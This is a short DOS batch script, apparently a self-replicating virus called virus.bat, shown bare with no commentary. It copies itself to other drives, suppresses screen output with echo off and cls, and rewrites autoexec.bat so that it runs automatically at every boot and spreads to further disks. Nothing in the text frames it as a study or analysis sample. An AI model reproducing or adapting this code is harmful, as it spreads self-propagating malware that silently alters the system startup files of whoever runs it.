if %1virus==virus autoexec virus

if exist %1virus.bat virus %2

if not exist %1autoexec.bat virus %2

copy virus.bat %1|echo echo off>virus

echo cls>>virus

echo if exist %%1virus.bat virus b:\ c:\>>virus

type %1autoexec.bat>>virus

copy virus %1autoexec.bat|del virus|virus %2

